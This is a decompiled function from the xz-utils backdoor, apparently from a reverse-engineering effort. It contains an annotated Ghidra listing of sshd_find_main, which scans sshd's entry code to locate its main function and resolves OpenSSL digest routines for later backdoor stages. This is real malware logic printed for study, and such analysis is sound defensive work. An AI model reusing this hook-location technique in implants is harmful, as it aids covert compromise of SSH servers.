// /home/kali/xzre-ghidra/xzregh/102550_sshd_find_main.c
// Function: sshd_find_main @ 0x102550
// Calling convention: unknown
// Prototype: undefined sshd_find_main(void)


/*
 * AutoDoc: Obtains sshd's code segment, decodes the entry stub, and looks for the instruction pair that
 * loads the real `sshd_main` address right before the `__libc_start_main` thunk. When it sees a
 * matching MOV/LEA that targets the GOT slot for libc's entry point it records the discovered
 * `sshd_main`, resolves EVP_Digest/EVP_sha256, and caches the stub pointers inside
 * `imported_funcs` so later recon code can reuse them without reopening libcrypto.
 */
#include "xzre_types.h"


undefined8 sshd_find_main(ulong *param_1,long *param_2,long *param_3,long param_4)

{
  long lVar1;
  int iVar2;
  long lVar3;
  ulong uVar4;
  long lVar5;
  ulong uVar6;
  long lVar7;
  long *plVar8;
  ulong uVar9;
  ulong uVar10;
  ulong uVar11;
  ulong uVar12;
  byte bVar13;
  long local_88;
  long local_80;
  long local_78;
  byte local_6f;
  byte local_65;
  uint local_64;
  int local_58;
  long local_50;
  
  bVar13 = 0;
  local_88 = 0;
  lVar3 = get_lzma_allocator(1);
  *(long **)(lVar3 + 0x10) = param_3;
  uVar4 = elf_get_code_segment(param_2,&local_88);
  if (uVar4 != 0) {
    uVar12 = local_88 + uVar4;
    lVar5 = lzma_alloc(0x758,lVar3);
    *(long *)(param_4 + 0x70) = lVar5;
    if (lVar5 != 0) {
      *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
    }
    lVar5 = elf_get_got_symbol(param_2,0x228);
    if (((lVar5 != 0) && (uVar9 = *param_2 + *(long *)(*param_2 + 0x18), uVar9 < uVar12)) &&
       (uVar4 <= uVar9)) {
      plVar8 = &local_80;
      lVar7 = 0x16;
      uVar10 = uVar9 + 0x200;
      if (uVar12 <= uVar9 + 0x200) {
        uVar10 = uVar12;
      }
      for (; lVar7 != 0; lVar7 = lVar7 + -1) {
        *(undefined4 *)plVar8 = 0;
        plVar8 = (long *)((long)plVar8 + (ulong)bVar13 * -8 + 4);
      }
      lVar7 = elf_symbol_get(param_3,0xf8,0);
      if (lVar7 != 0) {
        lVar7 = *(long *)(lVar7 + 8);
        lVar1 = *param_3;
        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
        *(long *)(param_4 + 0xf0) = lVar7 + lVar1;
      }
      uVar11 = 0;
      while (uVar9 < uVar10) {
        iVar2 = x86_dasm(&local_80,uVar9,uVar10);
        if (iVar2 == 0) {
          uVar9 = uVar9 + 1;
        }
        else {
          if (local_58 == 0x10d) {
            if (((((local_65 & 0x48) == 0x48) && (local_64 >> 8 == 0x50700)) &&
                (uVar6 = local_80 + local_78 + local_50, uVar4 <= uVar6)) && (uVar6 < uVar12)) {
              uVar11 = uVar6;
            }
          }
          else if (((uVar11 != 0) && (local_58 == 0x17f)) &&
                  ((local_64 >> 8 == 0x50200 &&
                   (((local_6f & 1) != 0 && (lVar5 == local_50 + local_80 + local_78)))))) {
            lVar3 = elf_symbol_get(param_3,0xc60,0);
            if (lVar3 != 0) {
              *(long *)(param_4 + 0x58) = *(long *)(lVar3 + 8) + *param_3;
              *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
            }
            *param_1 = uVar11;
            return 1;
          }
          uVar9 = uVar9 + local_78;
        }
      }
    }
    lzma_free(*(undefined8 *)(param_4 + 0x70),lVar3);
  }
  return 0;
}

